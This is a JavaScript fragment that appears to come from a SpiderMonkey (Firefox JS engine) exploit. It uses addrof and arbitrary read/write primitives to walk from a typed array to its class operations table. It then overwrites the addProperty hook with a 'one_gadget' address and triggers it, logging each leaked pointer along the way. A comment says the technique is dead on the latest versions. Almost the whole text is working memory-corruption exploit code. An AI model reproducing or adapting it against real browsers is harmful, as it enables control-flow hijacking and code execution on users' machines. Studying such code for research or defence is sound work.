
// This technique is dead on latest SM versions
let c = new Uint8Array(8);
let c_addr = BigInt(Int64.fromJSValue(addrof(c)));
let c_shape = arb_r8(c_addr);
let c_baseshape = arb_r8(c_shape);
let c_clasp = arb_r8(c_baseshape);
let c_cOps = arb_r8(c_clasp+0x10n);

console.log("[+] Target Object addr:\t\t\t0x"+c_addr.toString(16));
console.log("[+] Target Object Shape:\t\t0x"+c_shape.toString(16));
console.log("[+] Target Object BaseShape:\t\t0x"+c_baseshape.toString(16));
console.log("[+] Target Object Class Properties:\t0x"+c_clasp.toString(16));
console.log("[+] Target Object Class Options:\t0x"+c_cOps.toString(16));

arb_w8(c_cOps, one_gadget);
let new_val = BigInt(Int64.fromJSValue(arb_read(c_cOps, 8)));;
console.log("[+] Modified Class addProperty:\t\t0x"+new_val.toString(16));
Math.atan2(c);
c.aaaa=1;
